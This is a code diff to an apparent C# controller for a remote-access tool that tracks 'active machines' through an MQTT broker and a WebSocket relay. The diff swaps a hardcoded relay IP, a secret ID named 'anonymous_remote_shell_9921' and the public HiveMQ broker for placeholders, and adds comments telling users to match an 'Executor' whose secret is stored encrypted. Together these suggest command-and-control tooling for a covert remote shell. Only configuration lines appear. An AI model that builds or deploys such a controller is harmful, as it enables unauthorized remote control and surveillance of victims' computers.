@@ -73,7 +73,8 @@ class VncViewer : Form {
     public PictureBox pic = new PictureBox();
     private Panel kbPanel = new Panel();
     private ClientWebSocket? wsClient;
-    private string RELAY_SERVER = "ws://51.83.6.5:20113";
+    // ⚠️ IMPORTANT: Change this to your relay server address
+    private string RELAY_SERVER = "ws://YOUR_RELAY_SERVER_IP:20113"; // ⚠️ CHANGE THIS to your relay server (e.g., "ws://katabump.com:20113")
 
     public VncViewer(string t, string s, IMqttClient c) {
         target = t; secret = s; client = c;
@@ -425,7 +426,9 @@ class VncViewer : Form {
 
 class Controller
 {
-    static string secretId = "anonymous_remote_shell_9921";
+    // ⚠️ IMPORTANT: Change this to match your Executor's Secret ID
+    // This must be the SAME as the decrypted sk[] value in Executor/Program.cs
+    static string secretId = "YOUR_UNIQUE_SECRET_ID_HERE"; // ⚠️ CHANGE THIS to match Executor
     static ConcurrentDictionary<string, MachineInfo> activeMachines = new ConcurrentDictionary<string, MachineInfo>();
     static string selectedMachine = "";
     static StatsWindow currentStatsWindow = null;
@@ -446,8 +449,9 @@ class Controller
         var mqttFactory = new MqttFactory();
         using (var mqttClient = mqttFactory.CreateMqttClient())
         {
-            var options = new MqttClientOptionsBuilder().WithTcpServer("broker.hivemq.com").Build();
-            Console.WriteLine("[*] Connecting to public broker (HiveMQ)...");
+            // ⚠️ IMPORTANT: Change this to match your Executor's MQTT broker
+            var options = new MqttClientOptionsBuilder().WithTcpServer("YOUR_MQTT_BROKER_ADDRESS").Build(); // ⚠️ CHANGE THIS (e.g., "broker.hivemq.com")
+            Console.WriteLine("[*] Connecting to MQTT broker...");
             
             mqttClient.ApplicationMessageReceivedAsync += e => {
                 string t = e.ApplicationMessage.Topic;
